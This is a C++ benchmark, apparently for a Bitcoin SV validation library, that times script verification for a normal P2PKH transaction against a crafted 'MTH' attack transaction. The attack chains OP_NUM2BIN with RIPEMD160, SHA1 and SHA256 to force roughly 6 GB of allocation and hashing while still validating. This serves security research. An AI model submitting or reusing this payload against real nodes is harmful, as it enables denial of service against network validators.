/// Benchmark: standard P2PKH transaction vs MTH (Memory-Time-Hash) attack transaction.
///
/// Both transactions are pre-created and serialized before measurement.
/// Only se.VerifyScript() execution time is measured.
///
/// MTH attack: OP_NUM2BIN inflates a small stack element into a large buffer
/// (up to INT32_MAX bytes), which a following hash opcode (RIPEMD160/SHA1/SHA256)
/// must process in full. The script is valid and returns SCRIPT_ERR_OK — the
/// resource cost is the attack.

#include <cassert>
#include <chrono>
#include <cstdint>
#include <iomanip>
#include <iostream>
#include <limits>
#include <stdexcept>
#include <string>
#include <vector>

#include <boost/program_options.hpp>

namespace po = boost::program_options;

#include "base58.h"
#include "chainparams.h"
#include "core_io.h"
#include "key.h"
#include "keystore.h"
#include "script/script_num.h"
#include "script/sign.h"
#include "util.h"
#include "utilstrencodings.h"

#include "assembler.h"
#include "extendedTx.hpp"
#include "txvalidator.hpp"

// ============================================================
// Fixed benchmark parameters (not exposed as program args)
// ============================================================

static constexpr int32_t UTXO_HEIGHT  = 620539; // post-Genesis UTXO (Genesis @ 620538)
static constexpr int32_t BLOCK_HEIGHT = 720540; // post-Genesis spending block
static constexpr bool    CONSENSUS    = true;   // block-validation mode (skips IsStandardTx)

// Defaults for program-argument parameters.
// NUM2BIN_SIZE upper bound is INT32_MAX: values above cannot be encoded as CScriptNum
// and would throw scriptnum_overflow_error at transaction build time.
static constexpr int64_t DEFAULT_NUM2BIN_SIZE = std::numeric_limits<int32_t>::max(); // ~2 GB
static constexpr int     DEFAULT_NB_ITER      = 10;

// ============================================================
// Transaction building helpers (shared between both builders)
// ============================================================

static CMutableTransaction BuildCreditingTransaction(const CScript& scriptPubKey, const Amount nValue)
{
    CMutableTransaction txCredit;
    txCredit.nVersion = 1;
    txCredit.nLockTime = 0;
    txCredit.vin.resize(1);
    txCredit.vout.resize(1);
    txCredit.vin[0].prevout = COutPoint();
    txCredit.vin[0].scriptSig = CScript() << CScriptNum(0) << CScriptNum(0);
    txCredit.vin[0].nSequence = CTxIn::SEQUENCE_FINAL;
    txCredit.vout[0].scriptPubKey = scriptPubKey;
    txCredit.vout[0].nValue = nValue;
    return txCredit;
}

static CMutableTransaction BuildSpendingTransaction(const CScript& scriptSig,
                                                    const CMutableTransaction& txCredit)
{
    CMutableTransaction txSpend;
    txSpend.nVersion = 1;
    txSpend.nLockTime = 0;
    txSpend.vin.resize(1);
    txSpend.vout.resize(1);
    txSpend.vin[0].prevout = COutPoint(txCredit.GetId(), 0);
    txSpend.vin[0].scriptSig = scriptSig;
    txSpend.vin[0].nSequence = CTxIn::SEQUENCE_FINAL;
    txSpend.vout[0].scriptPubKey = CScript();
    txSpend.vout[0].nValue = txCredit.vout[0].nValue;
    return txSpend;
}

static std::vector<uint8_t> MakeSig(CScript& scriptPubKey, const CKey& key,
                                     CMutableTransaction& spendTx, Amount amount)
{
    SigHashType sigHashType = SigHashType().withForkId();
    uint256 hash = SignatureHash(scriptPubKey, CTransaction(spendTx), 0, sigHashType, amount);
    std::vector<uint8_t> vchSig;
    if (!key.Sign(hash, vchSig))
        throw std::runtime_error("MakeSig: ECDSA signing failed");
    vchSig.push_back(static_cast<uint8_t>(sigHashType.getRawSigHashType()));
    return vchSig;
}

static CScript PushAll(const std::vector<valtype>& values)
{
    CScript result;
    for (const valtype& v : values) {
        if (v.empty())
            result << OP_0;
        else if (v.size() == 1 && v[0] >= 1 && v[0] <= 16)
            result << EncodeOP_N(v[0]);
        else
            result << v;
    }
    return result;
}

static std::vector<uint8_t> Serialise(const bsv::CMutableTransactionExtended& eTX)
{
    CDataStream out(SER_NETWORK, PROTOCOL_VERSION);
    out << eTX;
    return std::vector<uint8_t>(out.begin(), out.end());
}

// ============================================================
// Standard P2PKH transaction
// ============================================================
//
//   scriptPubKey : OP_DUP OP_HASH160 <hash160(pubkey)> OP_EQUALVERIFY OP_CHECKSIG
//   scriptSig    : <sig> <pubkey>
//
// Verification cost: one ECDSA signature check — fast (~microseconds).

static bsv::CMutableTransactionExtended BuildStandardTransaction(const std::string& network)
{
    SelectParams(network, std::nullopt);

    const std::string wif = "5HxWvvfubhXpYYpS3tJkw6fq9jE9j18THftkZjHHfmFiWtmAbrj";
    CBitcoinSecret secret;
    secret.SetString(wif);
    CKey    key    = secret.GetKey();
    CPubKey pubkey = key.GetPubKey();

    const Amount amount{1000000};
    CMutableTransaction txCredit = BuildCreditingTransaction(
        GetScriptForDestination(pubkey.GetID()), amount);

    CMutableTransaction txSpend = BuildSpendingTransaction(CScript(), txCredit);
    txSpend.vout[0].scriptPubKey = GetScriptForDestination(pubkey.GetID());

    CScript& scriptPubKey = txCredit.vout[0].scriptPubKey;
    std::vector<uint8_t> sig = MakeSig(scriptPubKey, key, txSpend, amount);

    std::vector<valtype> sigResult;
    sigResult.push_back(sig);
    sigResult.push_back(ToByteVector(pubkey));
    txSpend.vin[0].scriptSig = PushAll(sigResult);

    bsv::CMutableTransactionExtended eTX;
    eTX.vutxo = txCredit.vout;
    eTX.mtx   = txSpend;
    return eTX;
}

// ============================================================
// MTH attack transaction
// ============================================================
//
//   Stack on entry (bottom → top): [ data(32B) | NUM2BIN_SIZE ]
//
//   OP_DUP                        [ data | size | size ]          alt=[]
//   OP_TOALTSTACK                 [ data | size ]                 alt=[ size ]
//   OP_NUM2BIN    (1st alloc)     [ blob(NUM2BIN_SIZE) ]         alt=[ size ]
//   OP_RIPEMD160  (1st hash)      [ hash1(20B) ]                 alt=[ size ]
//   OP_FROMALTSTACK               [ hash1 | size ]               alt=[]
//   OP_DUP                        [ hash1 | size | size ]        alt=[]
//   OP_TOALTSTACK                 [ hash1 | size ]               alt=[ size ]
//   OP_NUM2BIN    (2nd alloc)     [ blob(NUM2BIN_SIZE) ]         alt=[ size ]
//   OP_SHA1       (2nd hash)      [ hash2(20B) ]                 alt=[ size ]
//   OP_FROMALTSTACK               [ hash2 | size ]               alt=[]
//   OP_NUM2BIN    (3rd alloc)     [ blob(NUM2BIN_SIZE) ]         alt=[]
//   OP_SHA256     (3rd hash)      [ hash3(32B) ]                 alt=[]
//   <4> OP_SPLIT                  [ first4 | remaining28 ]       alt=[]
//   OP_DROP                       [ first4 ]                     alt=[]
//   OP_0NOTEQUAL                  [ 1 (true) ]  →  SCRIPT_ERR_OK
//
//   Peak memory : 1 × NUM2BIN_SIZE  (sequential, not simultaneous)
//   Total hashing: 3 × NUM2BIN_SIZE bytes

static bsv::CMutableTransactionExtended BuildAttackTransaction(const std::string& network,
                                                               int64_t num2binSize)
{
    SelectParams(network, std::nullopt);

    CScript scriptPubKey;
    scriptPubKey << OP_DUP << OP_TOALTSTACK
                 << OP_NUM2BIN << OP_RIPEMD160
                 << OP_FROMALTSTACK << OP_DUP << OP_TOALTSTACK
                 << OP_NUM2BIN << OP_SHA1
                 << OP_FROMALTSTACK << OP_NUM2BIN << OP_SHA256
                 << CScriptNum(4) << OP_SPLIT << OP_DROP << OP_0NOTEQUAL;

    const Amount nValue{1000000};
    CMutableTransaction txCredit = BuildCreditingTransaction(scriptPubKey, nValue);

    std::vector<uint8_t> inputData(32, 0x42); // any 32-byte value
    CScript scriptSig;
    scriptSig << inputData << CScriptNum(num2binSize);

    CMutableTransaction txSpend = BuildSpendingTransaction(scriptSig, txCredit);

    bsv::CMutableTransactionExtended eTX;
    eTX.vutxo = txCredit.vout;
    eTX.mtx   = txSpend;
    return eTX;
}

// ============================================================
// Benchmark infrastructure
// ============================================================

struct BenchResult {
    int64_t total_ns = 0;
    int64_t min_ns   = std::numeric_limits<int64_t>::max();
    int64_t max_ns   = 0;
    int     iters    = 0;

    double avg_us()     const { return total_ns / 1000.0 / iters; }
    double min_us()     const { return min_ns   / 1000.0; }
    double max_us()     const { return max_ns   / 1000.0; }
    double avg_ms()     const { return avg_us() / 1000.0; }
    double total_s()    const { return total_ns / 1.0e9; }
    double throughput() const { return iters    / total_s(); }
};

static BenchResult RunBenchmark(const bsv::CTxValidator&   se,
                                 const std::vector<uint8_t>& txBin,
                                 std::span<const int32_t>    utxoHeights,
                                 int32_t                     blockHeight,
                                 bool                        consensus,
                                 int                         iterations)
{
    BenchResult r;
    r.iters = iterations;

    for (int i = 0; i < iterations; ++i) {
        const auto start = std::chrono::steady_clock::now();
        const TxError ret = se.VerifyScript(txBin, utxoHeights, blockHeight, consensus);
        const auto end   = std::chrono::steady_clock::now();

        if (!bsv::TxErrorIsOk(ret))
            throw std::runtime_error("VerifyScript failed at iteration " + std::to_string(i));

        const int64_t ns =
            std::chrono::duration_cast<std::chrono::nanoseconds>(end - start).count();
        r.total_ns += ns;
        if (ns < r.min_ns) r.min_ns = ns;
        if (ns > r.max_ns) r.max_ns = ns;
    }

    return r;
}

static void PrintResult(const std::string& label, const BenchResult& r)
{
    std::cout << std::fixed;
    std::cout << "  " << label << "\n";
    std::cout << "    Iterations : " << r.iters << "\n";
    std::cout << "    Total      : " << std::setprecision(4) << r.total_s()    << " s\n";
    std::cout << "    Average    : " << std::setprecision(3) << r.avg_ms()     << " ms"
              << "  (" << std::setprecision(1) << r.avg_us() << " µs)\n";
    std::cout << "    Min        : " << std::setprecision(3) << r.min_us()/1000.0 << " ms\n";
    std::cout << "    Max        : " << std::setprecision(3) << r.max_us()/1000.0 << " ms\n";
    std::cout << "    Throughput : " << std::setprecision(1) << r.throughput() << " verif/s\n";
}

// ============================================================
// main
// ============================================================

int main(int argc, char* argv[])
{
    // ---- Parse arguments ----
    int64_t num2binSize = DEFAULT_NUM2BIN_SIZE;
    int     nbIter      = DEFAULT_NB_ITER;

    po::options_description desc("MTH attack benchmark options");
    desc.add_options()
        ("help,h",
            "Show this help message")
        ("num2bin-size,s",
            po::value<int64_t>(&num2binSize)->default_value(DEFAULT_NUM2BIN_SIZE),
            "Bytes each OP_NUM2BIN call allocates (1 .. INT32_MAX). "
            "Total hashing per verification = 3 x this value. "
            "WARNING: values close to INT32_MAX (~2 GB) require large amounts of RAM.")
        ("iterations,i",
            po::value<int>(&nbIter)->default_value(DEFAULT_NB_ITER),
            "Number of VerifyScript iterations for each transaction type.");

    po::variables_map vm;
    try {
        po::store(po::parse_command_line(argc, argv, desc), vm);
        if (vm.count("help")) {
            std::cout << desc << "\n";
            return 0;
        }
        po::notify(vm);
    }
    catch (const po::error& e) {
        std::cerr << "Argument error: " << e.what() << "\n" << desc << "\n";
        return 1;
    }

    if (num2binSize < 1 || num2binSize > std::numeric_limits<int32_t>::max()) {
        std::cerr << "Error: --num2bin-size must be in range [1, "
                  << std::numeric_limits<int32_t>::max() << "]\n";
        return 1;
    }
    if (nbIter < 1) {
        std::cerr << "Error: --iterations must be >= 1\n";
        return 1;
    }

    const std::string network = CBaseChainParams::MAIN;

    // ---- Header ----
    std::cout << "================================================================\n";
    std::cout << "  MTH Attack Benchmark  (Memory-Time-Hash via OP_NUM2BIN)\n";
    std::cout << "================================================================\n";
    std::cout << "  Network        : " << network      << "\n";
    std::cout << "  UTXO height    : " << UTXO_HEIGHT  << "  (post-Genesis)\n";
    std::cout << "  Block height   : " << BLOCK_HEIGHT << "\n";
    std::cout << "  Consensus mode : " << (CONSENSUS ? "true" : "false") << "\n";
    std::cout << "  NUM2BIN_SIZE   : " << num2binSize << " bytes  ("
              << num2binSize / 1'000'000 << " MB per OP_NUM2BIN call)\n";
    std::cout << "  Total hashing  : ~" << 3 * num2binSize / 1'000'000
              << " MB per attack verification  (3 x OP_NUM2BIN -> RIPEMD160/SHA1/SHA256)\n";
    std::cout << "  Iterations     : " << nbIter << "\n";
    std::cout << "\n";

    const bsv::CTxValidator se(network);
    const std::array<int32_t, 1> utxoArray = {UTXO_HEIGHT};
    const std::span<const int32_t> utxoSpan(utxoArray);

    // ---- Build & serialise (not measured) ----
    std::cout << "Building transactions...\n";
    const std::vector<uint8_t> standardBin = Serialise(BuildStandardTransaction(network));
    const std::vector<uint8_t> attackBin   = Serialise(BuildAttackTransaction(network, num2binSize));
    std::cout << "  Standard tx (P2PKH)  : " << standardBin.size() << " bytes\n";
    std::cout << "  Attack  tx (MTH)     : " << attackBin.size()   << " bytes\n";
    std::cout << "\n";

    // ---- Pre-flight: verify both are valid ----
    std::cout << "Pre-flight verification...\n";
    if (!bsv::TxErrorIsOk(se.VerifyScript(standardBin, utxoSpan, BLOCK_HEIGHT, CONSENSUS)))
        throw std::runtime_error("Standard tx: pre-flight failed");
    std::cout << "  Standard tx : SCRIPT_ERR_OK\n";
    if (!bsv::TxErrorIsOk(se.VerifyScript(attackBin,   utxoSpan, BLOCK_HEIGHT, CONSENSUS)))
        throw std::runtime_error("Attack tx: pre-flight failed");
    std::cout << "  Attack  tx  : SCRIPT_ERR_OK  (attack succeeds silently)\n";
    std::cout << "\n";

    // ---- Warmup (not measured) ----
    // Standard tx is cheap — run more warmup iterations to stabilise the branch predictor.
    // Attack tx allocates NUM2BIN_SIZE bytes per call — keep warmup small.
    std::cout << "Warming up...\n";
    {
        constexpr int WARMUP_STD = 50;
        std::cout << "  Standard tx (" << WARMUP_STD << " iterations)... " << std::flush;
        for (int i = 0; i < WARMUP_STD; ++i)
            se.VerifyScript(standardBin, utxoSpan, BLOCK_HEIGHT, CONSENSUS);
        std::cout << "done.\n";
    }
    {
        constexpr int WARMUP_ATK = 3;
        std::cout << "  Attack  tx  (" << WARMUP_ATK << " iterations)... " << std::flush;
        for (int i = 0; i < WARMUP_ATK; ++i)
            se.VerifyScript(attackBin, utxoSpan, BLOCK_HEIGHT, CONSENSUS);
        std::cout << "done.\n";
    }
    std::cout << "\n";

    // ---- Benchmark ----
    std::cout << "Running benchmark (" << nbIter << " iterations each)...\n";

    std::cout << "  Standard tx... " << std::flush;
    const BenchResult stdResult = RunBenchmark(se, standardBin, utxoSpan, BLOCK_HEIGHT, CONSENSUS, nbIter);
    std::cout << "done.\n";

    std::cout << "  Attack  tx ... " << std::flush;
    const BenchResult atkResult = RunBenchmark(se, attackBin,   utxoSpan, BLOCK_HEIGHT, CONSENSUS, nbIter);
    std::cout << "done.\n";
    std::cout << "\n";

    // ---- Report ----
    const std::string sep(64, '-');
    std::cout << sep << "\n";
    std::cout << "  RESULTS\n";
    std::cout << sep << "\n";
    PrintResult("Standard P2PKH tx:", stdResult);
    std::cout << "\n";
    PrintResult("MTH attack tx    :", atkResult);
    std::cout << "\n";
    std::cout << sep << "\n";
    std::cout << "  COMPARISON\n";
    std::cout << sep << "\n";
    std::cout << std::fixed;

    const double ratioAvg   = atkResult.avg_us()  / stdResult.avg_us();
    const double ratioTotal = atkResult.total_s()  / stdResult.total_s();
    const double extraMs    = (atkResult.avg_us() - stdResult.avg_us()) / 1000.0;

    std::cout << "  Attack avg cost : " << std::setprecision(1) << ratioAvg
              << "x slower per verification\n";
    std::cout << "  Attack total    : " << std::setprecision(1) << ratioTotal
              << "x more total time\n";
    std::cout << "  Extra cost/iter : +" << std::setprecision(3) << extraMs
              << " ms per verification  (wasted on memory + hashing)\n";
    std::cout << "\n";
    std::cout << "  Note: attack tx is " << attackBin.size() << " bytes vs "
              << standardBin.size() << " bytes standard — "
              << std::setprecision(1)
              << static_cast<double>(atkResult.avg_us()) / attackBin.size()
              << " µs/byte vs "
              << static_cast<double>(stdResult.avg_us()) / standardBin.size()
              << " µs/byte.\n";
    std::cout << sep << "\n";

    return 0;
}
